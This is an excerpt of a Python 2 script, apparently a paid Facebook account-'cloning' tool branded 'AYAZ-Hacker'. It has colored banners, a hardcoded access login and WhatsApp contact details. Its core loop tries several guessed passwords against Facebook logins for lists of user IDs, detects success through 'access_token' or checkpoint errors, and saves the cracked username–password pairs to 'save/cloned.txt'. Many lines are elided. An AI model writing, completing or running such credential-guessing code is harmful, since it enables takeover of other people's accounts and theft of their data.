...
\033[1;96m---------------------AYAZ-Hacker---------------------
                
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m ITX-Hacker.                                
\033[0;91m║\033[0;91m FB :\033[0;92m "AYAZ-KHAN"                                             
\033[0;95m╰════════════════════════════════════════════╯
             
                
\033[1;96mSORRY THIS TOOL IS PAID PLEASE CONTENT 03146152692 GIVE TOKAN
"""
...
\033[1;99m If you face any problem contact me on Whatsapp +923146152692
 
\033[1;96m------------------THE AYAZ💜HACKER----------------------
 
 
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mA.AYAZ KHAN .                                   
...
\033[1;95mSWABI KHO SWABI DA KANA”
                                                
\033[1;96mthis is paid tool Contect 03146152692
"""
CorrectUsername = "AYAZ"
CorrectPassword = "RAHI"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://wa.me/+923146152692 ')
    else:
...
def action():
    ...
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan('\033[1;96m▬PROGRAMED BY AYAZKHAN')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m(RAHI-OK)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(RAHI-OK) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m(RAHI-OK)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(RAHI-OK) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m(RAHI-OK)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(CP-NN) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
